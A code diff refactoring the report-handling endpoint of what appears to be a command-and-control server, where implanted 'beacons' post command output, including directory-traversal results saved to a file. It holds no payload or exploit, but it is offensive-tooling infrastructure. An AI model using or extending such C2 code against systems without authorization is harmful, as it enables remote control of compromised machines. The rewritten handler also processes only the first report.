@@ -2,8 +2,6 @@ from flask import Flask, request, jsonify, redirect
 import uuid
 import time
 import logging
-import os
-import base64
 from flask_socketio import SocketIO
 from Modules.global_objects import (
     beacon_list, add_beacon_list, command_list, config)
@@ -126,51 +124,34 @@ def beaconCallIn(part1, part2):
     return jsonify(data), 200
 
 
-@beaconControl.route('/updateReport/<path1>/api/v<int:version>',
-                     methods=['POST'])
+@beaconControl.route('/updateReport/<path1>/api/v<int:version>', methods=['POST'])
 def response(path1, version):
     if version not in range(1, 11):
         return '', 404
-    json_data = request.get_json()
-    if isinstance(json_data, dict):
-        reports = json_data.get('reports', [])
-    elif isinstance(json_data, list):
-        reports = json_data
+    data = request.get_json()
+    reports = data.get('reports', [])
+    if reports and 'command_uuid' in reports[0]:
+        cid = reports[0]['command_uuid']
+        output = reports[0]['output']
     else:
-        return '', 400
-    for report in reports:
-        cid = report.get('command_uuid', '')
-        output = report.get('output', '')
-        found = False
-        for commandID, command in command_list.items():
-            if commandID == cid:
-                found = True
-                for i, (beaconID, beacon) in enumerate(beacon_list.items()):  # Updated loop
-                    if beaconID == command.beacon_uuid:
-                        # Update beacon attributes
-                        beacon.last_beacon = time.asctime()
-                        timer = beacon.timer
-                        jitter = beacon.jitter
-                        next_beacon_time = time.time() + timer
-                        beacon.next_beacon = time.asctime(
-                            time.localtime(next_beacon_time))
-                        socketio.emit('countdown_update', {
-                            'uuid': command.beacon_uuid,
-                            'timer': timer,
-                            'jitter': jitter,
-                        })
-                    else:
-                        print(
-                            f"Command {beaconID} ",
-                            "responded with:"
-                        )
-                        print(output)
-                    socketio.emit('command_response',{
-                        'uuid': beaconID,
-                        'command': command.command,
-                        'response': output
-                    })
+        cid = ''
+        output = ''
+    found = False
+    for _, command in enumerate(command_list.values()):
+        if cid == command.command_uuid:
+            found = True
+            command.command_output = output
+            if command.command == "directory_traversal":
+                # need to handle this properly
+                print("Directory Traversal Responded, saved to file")
+                with open("directory_traversal.txt", "w") as f:
+                    f.write(output)
+            else:
+                print(
+                    f"Command {command.beacon_uuid} ",
+                    "responded with:"
+                )
+                print(output)
     if not found:
         return '', 500
     return '', 200
-
